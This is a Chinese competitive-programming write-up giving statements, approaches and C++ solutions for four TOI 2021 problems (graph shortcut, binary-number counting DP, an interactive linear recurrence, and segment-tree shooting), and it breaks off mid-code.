https://hackmd.io/@omeletwithoutegg/TOI-2021-sols\n如果只想看題目可以戳\nhttps://www.facebook.com/notes/%E8%B3%87%E8%A8%8A%E7%AB%B6%E8%B3%BD%E9%81%B8%E6%89%8B%E6%96%B0%E6%89%8B%E6%9D%91/toi-2021/823380795202246/\n免責條款 因為測資不一定夠強，有些解也是賽後討論才AC或是甚至只有精神AC的\n所以這裡的解有可能任何錯誤或是唬爛，不可全盤相信。\n註：三模跟四模的 code 幾乎都沒有丟到師大開放的臨時 judge 上跑，所以不保證正確。\n一模 p1 shortcut 題意 定義一張圖的總花費是所有點對之間的最短距離總和。\n給定一張 $n$ 點 $m$ 邊的簡單無向連通圖，在你可以加一條邊的情況下，和原圖相比最多可以減少多少總花費？又有幾種加邊的方式可以減少那麼多花費？\n限制 $3 \\leq n \\leq 500; n-1 \\leq m \\leq n(n-1)/2-1$\nsubtask 1 (9) $n \\leq 40$ subtask 2 (22) $n \\leq 150$ subtask 3 (18) $m = n-1$ subtask 4 (51) 無額外限制 作法 $\\mathcal{O}(n^5)$\n$\\mathcal{O}(n^2)$枚舉要加的邊，每次重新做$n$次BFS(一次$\\mathcal{O}(n+m)$)或是Floyd-Warshall $\\mathcal{O}(n^4)$\n每次枚舉要加的邊$(a,b)$時，計算每個點對的距離減少了多少，也就是$\\sum_{i \u0026lt; j} \\max(0, d(i,j) - (d(i,a)+1+d(b,j)), d(i,j)-(d(i,b)+1+d(a,j)))$，其中$d(i,j)$是原圖中$i$與$j$的最短距離，可以$\\mathcal{O}(n^3)$預處理。 $\\mathcal{O}(n^3)$\n前面的那個式子裡面的項代表的分別是$i\\to a\\to b\\to j$和$i\\to b\\to a\\to j$兩條路徑所減少的距離。可以發現這兩條路徑只有其中一條可能比原圖$i\\to j$的路徑短，因為如果兩條都比原本的最短路徑短的話，那麼$i\\to a\\to j$或是$i\\to b\\to j$其中一個會是更短路徑，矛盾。\n也就是說，我們在算總花費減少多少的時候可以改為計算$\\sum_{ i,j}\\max(0,d(i,j)-(d(i,a)+1+d(b,j)))$\n考慮固定 $i,b$，那麼$j,a$之間是獨立的，我們可以拆成$\\max(0,(d(i,j)-d(b,j)-1) - d(i,a))$，而對於每個$A_i$，$\\sum_{j} \\max(0,B_j-A_i)$是一個經典的問題，可以利用前綴和、後綴和的概念，或是排序（counting sort）+爬行法在線性時間內解決。總複雜度是枚舉所有$i,b$所需的$\\mathcal{O}(n^2)$乘上對每個$a$計算$\\max(0,(d(i,j)-d(b,j)-1) - d(i,a))$所需要的複雜度$\\mathcal{O}(n)$，也就是$\\mathcal{O}(n^3)$。 code 註：下面的code可能有些變數跟上面寫的不太一樣，例如$i,j,a,b$的角色可能有點顛倒。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;, \u0026#34;unroll-loops\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define debug(a...) qqbx(#a, a) #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } #else #define debug(...) ((void)0) #define safe ((void)0) #endif // local using namespace std; using ll = int64_t; const int maxn = 505, inf = 1e9; int dis[maxn][maxn]; int ans[maxn][maxn]; ll sum[maxn]; int cnt[maxn]; int n, m; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for (int i = 0; i \u0026lt; n; i++) for (int j = 0; j \u0026lt; n; j++) if (i != j) dis[i][j] = inf; for (int i = 0; i \u0026lt; m; i++) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; --a, --b; dis[a][b] = dis[b][a] = 1; } for (int k = 0; k \u0026lt; n; k++) { for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; n; j++) { dis[i][j] = min(dis[i][j], dis[i][k] + dis[k][j]); } } } for (int a = 0; a \u0026lt; n; a++) { for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; n; j++) sum[j] = cnt[j] = 0; for (int b = 0; b \u0026lt; n; b++) { int d = dis[a][b] - dis[i][b] - 1; if (d \u0026lt; 0) continue; cnt[d] += 1; sum[d] += d; /* for (int j = 0; j \u0026lt; i; j++) { ans[i][j] += max(0, dis[a][b] - dis[i][b] - 1 - dis[a][j]); // \\sum _ {d \u0026gt;= dis[a][j]} (d - dis[a][j]) // where d = dis[a][b] - dis[i][b] - 1 } */ } for (int j = n-1; j \u0026gt;= 0; j--) sum[j] += sum[j+1], cnt[j] += cnt[j+1]; for (int j = 0; j \u0026lt; i; j++) { int d = dis[a][j]; ans[i][j] += sum[d] - cnt[d] * d; } } } ll mx = -1; int cnt = 0; for (int i = 0; i \u0026lt; n; i++) for (int j = 0; j \u0026lt; i; j++) { if (ans[i][j] == mx) ++cnt; else if (ans[i][j] \u0026gt; mx) mx = ans[i][j], cnt = 1; } cout \u0026lt;\u0026lt; cnt \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; mx \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } /* 5 4 1 2 2 3 3 4 2 5 5 5 1 2 2 3 3 4 4 5 5 1 */ p2 multiple 題意 給定 $n, m, k, R$，請輸出所有二進位表示法（不含前導 0）恰好有 $n$ 個 1， $m$ 個 0，且可以被 $k$ 整除的數字中，第 $R$ 大的數字。若答案不存在則輸出 impossible 。\n限制 $1 \\leq n, m \\leq 20000$\n$1 \\leq k \\leq 500$\n$1 \\leq R \\leq 10^9$\nsubtask 1 (13) $n, m, k \\leq 10$ subtask 2 (5) $k = 3$ subtask 3 (39) $n, m, k \\leq 500$ subtask 4 (24) $R = 1$ subtask 5 (19) 無額外限制 作法 $n,m,k\\leq 10$\n可以$\\mathcal{O}(2^{n+m})$枚舉所有$n$個1、$m$個0的數字 $n,m,k \\leq 500$\n先考慮答案是否是impossible的問題，等價於問說所有$n$個1、$m$個0、被$k$整除，且沒有前導0的數字是否有至少$R$種。先不管前導0的問題，我們可以列出DP式\n$$\nf(i,j,r) = f(i-1,j,r-2^{i+j-1}) + f(i,j-1,r)\n$$\n其中$f(i,j,r)$代表有$i$個1、$j$個0、除以$k$餘數是$r$的數字種類。\n那麼，只要看$f(n-1,m,-2^{n+m-1})$就能得知符合條件的數字有多少種。\n要如何得知第$R$大的字串呢？最高位必須先填1，我們從第二高位開始看。\n對於第 $i$ 位，假設填了1之後，後面剩下的後綴有$x$種方法使得整個數字是符合條件的，那麼如果$x \\geq R$，我們就知道第$R$大的數字第 $i$ 位是1了，因此就繼續看下一位，求取剩下的後綴的第$R$大符合條件的字串。如果$x \u0026lt; R$的話，第$R$大的數字第 $i$ 位就是0，要注意的是有 $x$ 個符合條件的數字第 $i$ 會是 $1$，也就是說我們必須求取剩下的後綴的第$R-x$大的符合條件的字串。\n說了那麼多其實就跟在二元樹上二分搜第$R$大的數有點類似，注意：不要找成第$R$小、不要忘記前導0、往左邊走的時候不要忘記扣掉右邊子樹大小。在計算$f$的時候可能會爆int，但是其實過程中可以跟1e9取min之類的，因為大於$R$的數字我們也不需要。\n時間跟空間複雜度是$\\mathcal{O}(nmk)$，似乎空間常數有點緊。 無額外限制\n$n$個1、$m$個0的字串有$\\binom{n+m}{n}$個，猜測平均大約每種可能出現的餘數會有$\\binom{n+m}{n}/k$個，那麼只要湊出每種餘數的方法數都超過$R$，就能不dp而直接從最高位開始不斷的拿1，直到$\\binom{n+m}{n}/k$足夠小。實際打表驗證，$\\min(n,m) \\geq 22$足夠使得每種mod下的每種餘數都出現至少$10^9$種字串。\n$\\min(n,m) \u0026lt; 22$的話，$\\mathcal{O}(nmk)$的演算法就足夠在時限內算出答案了，因為$nmk\\leq 20000\\times 22\\times 100 \\approx 4e8$ code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define debug(a...) qqbx(#a, a) #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } #else #define debug(...) ((void)0) #define safe ((void)0) #endif // local #define pb emplace_back #define all(v) begin(v),end(v) using namespace std; using ll = int64_t; const int maxn = 20005, maxm = 22, maxk = 500; const int inf = 1e9; void fail() { cout \u0026lt;\u0026lt; \u0026#34;impossible\\n\u0026#34;; exit(0); } void add(int \u0026amp;x, int v) { x = min(inf + 1, x + v); } int p2[maxn*2]; int dp[maxn][maxm][maxk]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, m, k, R; assert( cin \u0026gt;\u0026gt; m \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k \u0026gt;\u0026gt; R ); // while (k % 2 == 0); p2[0] = 1; for (int i = 1; i \u0026lt; maxn*2; i++) p2[i] = p2[i-1] * 2 % k; dp[0][0][0] = 1; for (int i = 0; i \u0026lt; maxn; i++) { for (int j = 0; j \u0026lt; maxm; j++) { for (int r = 0; r \u0026lt; k; r++) { if (i+1 \u0026lt; maxn) add(dp[i+1][j][r], dp[i][j][r]); if (j+1 \u0026lt; maxm) add(dp[i][j+1][(r + p2[i+j]) % k], dp[i][j][r]); } } } string ans; if (m \u0026lt; maxm) { int r = 0; for (int i = 0; i \u0026lt; n+m; i++) r = (r + p2[i]) % k; ans += \u0026#39;1\u0026#39;; --n; if (dp[n][m][r] \u0026lt; R) fail(); while (n \u0026gt; 0 || m \u0026gt; 0) { if (n \u0026gt; 0 \u0026amp;\u0026amp; dp[n-1][m][r] \u0026gt;= R) { ans += \u0026#39;1\u0026#39;; --n; } else { ans += \u0026#39;0\u0026#39;; if (n) R -= dp[n-1][m][r]; r = (r - p2[n+m-1] + k) % k; --m; } } } else { int r = 0; ans += \u0026#39;1\u0026#39;; r = (r - p2[n+m-1] + k) % k; --n; while (n \u0026gt;= maxm) { ans += \u0026#39;1\u0026#39;; r = (r - p2[n+m-1] + k) % k; --n; } if (dp[m][n][r] \u0026lt; R) fail(); while (n \u0026gt; 0 || m \u0026gt; 0) { if (n \u0026gt; 0 \u0026amp;\u0026amp; dp[m][n-1][(r-p2[n+m-1]+k)%k] \u0026gt;= R) { ans += \u0026#39;1\u0026#39;; r = (r - p2[n+m-1] + k) % k; --n; } else { ans += \u0026#39;0\u0026#39;; if (n) R -= dp[m][n-1][(r-p2[n+m-1]+k)%k]; --m; } } } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } p3 bacteria 題意 互動題，現在有一個遞迴數列形如\n$$\n\\left\\{\\begin{matrix}\na_0 = \u0026amp; A \\\\\na_1 = \u0026amp; A+B \\\\\na_n = \u0026amp; a_{n-1}+a_{n-2}+f(n) \u0026amp; (n \\geq 2)\n\\end{matrix}\\right.\n$$\n其中$f(n)$是下列四種的其中一種\n$f(n) = 1$ $f(n) = n^2$ $f(n) = n^2 \\times 2^n$ 如果$n$是奇數，$f(n) = 2^n$，否則$f(n) = 0$ 另外有一個祕密的$T$，保證$T \\geq 5$。\n現在給你$t(t \u0026gt; 0)$，請回答$a_{T+t}$除以$10^9+7$的餘數。你可以呼叫history(x)(必須滿足$0\\leq x\\leq 10^6$)，如果$x \\leq T$，評測系統會回答你$a_{T-x}$除以$10^9+7$的餘數，否則會回答你0。\n同時你也可以詢問$A$，$B$的值，或是$f(n)$是四種的哪一種，但是會被扣一定比例的分數。\n限制與計分 假設你呼叫的 history 次數為 $C_h$ ，此外同時定義 $C_M, C_A, C_B$ 三個數值，其中 $C_M$ 的值為 1 或 0，表示有無詢問$f(n)$的種類。$C_A$和$C_B$也相似，分別代表有無詢問$A$，$B$的值。得到的分數比重 $S$ 定義如下：\n$S = \\min(1.0, \\sqrt{\\frac{\\log 6}{\\log C_h}}) \\times (1.0 - 0.5 C_M - 0.1 C_A - 0.1 C_B)$\n對於每個 subtask ，若你成功回答所有詢問，你的得分就是該子任務的分數，乘上那筆 subtask 所有測資中 $S$ 最低者。\nsubtask 1 (4) $f(n)$是第一種，並且 $1 \\leq t \\leq 10^6$\nsubtask 2 (5) $f(n)$是第二種，並且 $1 \\leq t \\leq 10^6$\nsubtask 3 (6) $f(n)$是第三種，並且 $1 \\leq t \\leq 10^6$\nsubtask 4 (7) $f(n)$是第四種，並且 $1 \\leq t \\leq 10^6$\nsubtask 5 (23) $T \\leq 1000$，並且 $1 \\leq t \\leq 10^{18}$\nsubtask 6 (55) $T$ 無限制，$1 \\leq t \\leq 10^{18}$\n作法 subtask 1 ~ 4\n注意到不管$f(n)$是四種的哪一種，$a_n$都一樣是線性遞迴數列，並且遞迴關係跟$A,B,T$都沒有關係。因此若$a_n$是$k$階線性遞迴數列，那麼就問前$k$項之後想辦法求線性遞迴的下$t$項就好了。並且對於四種$f(n)$，$k$不會大於$5$，所以詢問次數不會太多。\n要列出算式可以：\n用紙筆硬推 假設遞迴關係，然後用高斯消去法 不要直接求出線性遞迴，只要想辦法寫出矩陣快速冪的形式，但裡面的項必須跟$A,B,T,n$都無關。 用BM演算法（ （有點唬爛的）滿分解\n首先不知道$f(n)$是哪一個了，只好按照遞迴階數由小到大帶進去，如果符合就回答，不符合就繼續看下一個遞迴關係是否符合。\n注意到，要確認是否是某種遞迴關係需要至少6項，正好可以問$x=0\\dots 5$，而不會超出範圍得到0。\n接著$t$的範圍也變得很大，必須用矩陣快速冪或是快速線性遞迴讓我們可以在$\\mathcal{O}(\\mathrm{poly}(k)\\log(t))$內得到接下來的第$t$項。\n只用高斯消去\n假設遞迴階數至多$k$階，那麼問了$2k$項之後就能直接用BM或是高斯消去解出遞迴關係，直接固定$k$傳上去可以撈到80分上下（\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define debug(a...) qqbx(#a, a) #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define pary(a...) danb(#a, a) template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (auto it = L; it != R; ++it) std::cerr \u0026lt;\u0026lt; *it \u0026lt;\u0026lt; \u0026#39; \u0026#39;; std::cerr \u0026lt;\u0026lt; \u0026#34;]\\033[0m\\n\u0026#34;; } #else #define debug(...) ((void)0) #define safe ((void)0) #define pary(...) ((void)0) #endif // local #define pb emplace_back #define all(v) begin(v),end(v) using namespace std; using ll = long long; const int MOD = 1000000007; int history(int); #ifdef local namespace solution { #endif // local const int maxk = 10, maxn = 1000025; vector\u0026lt;int\u0026gt; rec[4] = { {2, 0, 1000000006}, // 1 // {3, 1000000006, 1000000005}, // 2^k {1, 5, 1000000003, 1000000003}, // k\u0026amp;1 ? 2^k : 0 {7, 999999990, 14, 4, 999999999}, // k^2 * 2^k {4, 1000000002, 1, 2, 1000000006}, // k^2 }; int fastLinearRecurrence(vector\u0026lt;int\u0026gt; init, vector\u0026lt;int\u0026gt; rel, long long n) { vector\u0026lt;int\u0026gt; R{1}, E{0, 1}; auto mul = [\u0026amp;rel](vector\u0026lt;int\u0026gt; \u0026amp;a, const vector\u0026lt;int\u0026gt; \u0026amp;b) { vector\u0026lt;int\u0026gt; c(a.size() + b.size() - 1); for (size_t i = 0; i \u0026lt; a.size(); i++) for (size_t j = 0; j \u0026lt; b.size(); j++) c[i+j] = (c[i+j] + 1LL * a[i] * b[j]) % MOD; for (size_t i = c.size()-1; i \u0026gt;= rel.size(); i--) for (size_t j = 0; j \u0026lt; rel.size(); j++) c[i-j-1] = (c[i-j-1] + 1LL * rel[j] * c[i]) % MOD; c.resize(rel.size()); a = c; }; while (n) { if (n \u0026amp; 1) mul(R, E); mul(E, E); n \u0026gt;\u0026gt;= 1; } int sum = 0; for (size_t i = 0; i \u0026lt; R.size(); i++) sum = (sum + 1LL * init[i] * R[i]) % MOD; return sum; } int predict(ll t) { const int k = 6; vector\u0026lt;int\u0026gt; h(k); for (int i = 0; i \u0026lt; k; i++) h[i] = history(i); auto match = [\u0026amp;](vector\u0026lt;int\u0026gt; rel) { vector\u0026lt;int\u0026gt; v = h; if (rel.size() * 2 \u0026lt; v.size()) v.resize(rel.size() * 2); reverse(all(v)); pary(all(v)); pary(all(rel)); for (int i = v.size()-1, cnt = 0; i \u0026gt;= (int)rel.size(); i--) { ll sum = 0; for (size_t j = 0; j \u0026lt; rel.size(); j++) { sum = (sum + 1LL * rel[j] * v[i-j-1]) % MOD; } if (sum != v[i]) return debug(i, sum, v[i], rel.size()), false; } return true; }; for (int i = 0; i \u0026lt; 4; i++) { vector\u0026lt;int\u0026gt; v = h; v.resize(rec[i].size()); reverse(all(v)); pary(all(v)); debug(fastLinearRecurrence(v, rec[i], i+v.size()-1)); if (match(rec[i])) return fastLinearRecurrence(v, rec[i], t+v.size()-1); } return -1; } #ifdef local } const int maxn = 1000000; int val[maxn]; int pw[maxn]; int start, A, B; int history(int z) { if (z \u0026gt; start) return 0; return val[start - z]; } signed main() { cin \u0026gt;\u0026gt; start \u0026gt;\u0026gt; A \u0026gt;\u0026gt; B; val[0] = A; val[1] = A+B; pw[0] = 1; for (int i = 1; i \u0026lt; maxn; i++) pw[i] = pw[i-1] * 2 % MOD; for (int i = 2; i \u0026lt; maxn; i++) val[i] = 1LL*i*i%MOD*pw[i]%MOD; for (int i = 2; i \u0026lt; maxn; i++) val[i] = (0LL + val[i] + val[i-1] + val[i-2]) % MOD; cout \u0026lt;\u0026lt; solution::predict(1) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; debug(history(-1)); } #endif // local p4 shooting 題意 有 $n$ 個目標物，每個目標物都是一個水平線段 $[s, t]$ 或是只含一點（$s = t$ 的情形），並且有各自的分數 $w$，所有目標物的高度（Y 值）均大於 0 且互不相同（輸入按照 Y 座標由大到小排序）。\n現在依序發射了 $m$ 發砲彈，第 $i$ 次會從 X 軸上的整數點 $x_i$ 往上垂直發射砲彈，路線上第一個碰到的目標物就是擊中的目標，射中目標後砲彈與目標物一起消失，不會穿透。如果沒有擊中任何目標物，則該次射擊分數為 0。請輸出每次有擊中的目標物的分數總和。\n限制 $1 \\leq n, m \\leq 5 \\times 10^5$\n$0 \\leq s \\leq t \\leq 10^9, 0 \\leq w \\leq 1000$\n$0 \\leq x_i \\leq 10^9$\nsubtask 1 (5) $n, m \\leq 10^5$；X 座標範圍不超過 10000；對於所有目標物皆有 $s = t$\nsubtask 2 (7) $n, m \\leq 10^5$；X 座標範圍不超過 10000；對於每個目標線段皆有 $t-s \\leq 10$\nsubtask 3 (15) $n, m \\leq 10^5$；砲彈射擊位置為由左至右，也就是 $x_1 \\leq \u0026hellip; \\leq x_n$\nsubtask 4 (25) $n, m \\leq 10^5$\nsubtask 5 (48) 無額外限制 （ $n, m \\leq 5 \\times 10^5$ ）\n作法 $s = t$\n開一個vector\u0026lt;int\u0026gt; seg[10001]存每個X座標的目標物編號，接著每次發射砲彈就把那一格嘗試pop出東西來。 $t - s \\leq 10$\n延續前一個subtask的作法，但每一格存的是包含這一格的目標物編號，空間複雜度是$\\mathcal{O}(\\sum (t-s))$ 滿分解\n首先可以對$x_i$離散化（值域壓縮）\n從線段樹的結構出發，把每個目標物的區間拆成$\\mathcal{O}(\\log n)$個節點代表的區間，並把編號存在那些節點上，每個節點開一個vector之類的存。那麼要查一次射擊會打到誰，就是看那個葉子到根的路徑，Y座標最小而且還沒被射掉的目標物是誰了。 另一種滿分解\n從Y座標最小的目標物開始看，考慮他會被哪次射擊打到，也就是查詢這個區間裡面發射時間最早的是誰。假如整個區間都沒有發射過，那麼就直接忽略這個目標物；否則就把對應到的那一次發射記為已經用過。寫一個單點改值區間查詢最大值的線段樹之類的就完工啦～\n上面兩種解的時間複雜度都是$\\mathcal{O}(n\\log n)$，不過第一種作法要注意空的deque有點肥，因此使用deque、stack、queue都有可能MLE。 code 第一種解\nnote: not verified\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define pary(a...) danb(#a, a) #define debug(a...) qqbx(#a, a) template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;) , ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) std::cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; std::cerr \u0026lt;\u0026lt; \u0026#34; ]\\033[0m\\n\u0026#34;; } #else #define debug(...) ((void)0) #define safe ((void)0) #define pary(...) ((void)0) #endif // local #define all(v) begin(v),end(v) #define pb emplace_back #define get_pos(u,x) int(lower_bound(all(u),x)-begin(u)) using namespace std; using ll = int_fast64_t; using ld = long double; template \u0026lt;typename T\u0026gt; using min_heap = priority_queue\u0026lt;T, vector\u0026lt;T\u0026gt;, greater\u0026lt;T\u0026gt;\u0026gt;; const int mod = 1000000007; const int inf = 1e9; const ll INF = 1e18; const int maxn = 500002; bool removed[maxn]; struct Segtree { int n; vector\u0026lt;int\u0026gt; st[maxn * 4]; void init(int _n) { n = _n; } void add(int l, int r, int id) { for (l += n, r += n; l \u0026lt; r; l \u0026gt;\u0026gt;= 1, r \u0026gt;\u0026gt;= 1) { if (l \u0026amp; 1) st[l++].push_back(id); if (r \u0026amp; 1) st[--r].push_back(id); } } int query(int p) { int res = -1; for (p += n; p; p \u0026gt;\u0026gt;= 1) { while (!st[p].empty() \u0026amp;\u0026amp; removed[st[p].back()]) st[p].pop_back(); res = max(res, st[p].empty() ? -1 : st[p].back()); } return res; } } sgt; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; vector\u0026lt;tuple\u0026lt;int,int,int\u0026gt;\u0026gt; seg(n); vector\u0026lt;int\u0026gt; xs(m), u; for (auto \u0026amp;[s, t, w]: seg) cin \u0026gt;\u0026gt; s \u0026gt;\u0026gt; t \u0026gt;\u0026gt; w, ++t, u.pb(s), u.pb(t); for (int \u0026amp;x: xs) cin \u0026gt;\u0026gt; x; u.insert(u.end(), all(xs)); sort(all(u)), u.erase(unique(all(u)), u.end()); sgt.init(u.size()); for (int i = 0; i \u0026lt; n; i++) { auto [s, t, w] = seg[i]; s = get_pos(u, s); t = get_pos(u, t); sgt.add(s, t, i); } ll ans = 0; for (int x: xs) { x = get_pos(u, x); int id = sgt.query(x); if (id != -1) { debug(id); auto [s, t, w] = seg[id]; ans += w; removed[id] = true; } } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } 第二種解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define debug(a...) qqbx(#a, a) #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } #else #define debug(...) ((void)0) #define safe ((void)0) #endif // local #define pb emplace_back #define all(v) begin(v),end(v) using namespace std; using ll = int64_t; const int maxn = 505, inf = 1e9; struct Segtree { int n; vector\u0026lt;int\u0026gt; mn; Segtree(int sz, function\u0026lt;int(int)\u0026gt; v) : n(sz), mn(sz*2) { for (int i = 0; i \u0026lt; n; i++) mn[i+n] = v(i); for (int i = n-1; i \u0026gt; 0; i--) mn[i] = min(mn[i\u0026lt;\u0026lt;1], mn[i\u0026lt;\u0026lt;1|1]); } int queryMin(int l, int r) { int res = inf; for (l += n, r += n; l \u0026lt; r; l \u0026gt;\u0026gt;= 1, r \u0026gt;\u0026gt;= 1) { if (l \u0026amp; 1) res = min(res, mn[l++]); if (r \u0026amp; 1) res = min(res, mn[--r]); } return res; } void edit(int p, int v) { for (mn[p+=n] = v; p\u0026gt;1; p\u0026gt;\u0026gt;=1) mn[p\u0026gt;\u0026gt;1] = min(mn[p], mn[p^1]); } }; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; vector\u0026lt;tuple\u0026lt;int,int,int\u0026gt;\u0026gt; seg(n); vector\u0026lt;int\u0026gt; xs(m), u; for (auto \u0026amp;[s, t, w]: seg) cin \u0026gt;\u0026gt; s \u0026gt;\u0026gt; t \u0026gt;\u0026gt; w, ++t, u.pb(s), u.pb(t); for (int \u0026amp;x: xs) cin \u0026gt;\u0026gt; x; u.insert(u.end(), all(xs)); sort(all(u)), u.erase(unique(all(u)), u.end()); vector\u0026lt;multiset\u0026lt;int\u0026gt;\u0026gt; ms(u.size()); for (int i = 0; i \u0026lt; m; i++) { int x = lower_bound(all(u), xs[i]) - u.begin(); ms[x].insert(i); xs[i] = x; } Segtree sgt(u.size(), [\u0026amp;ms](int i){ return ms[i].empty() ? inf : 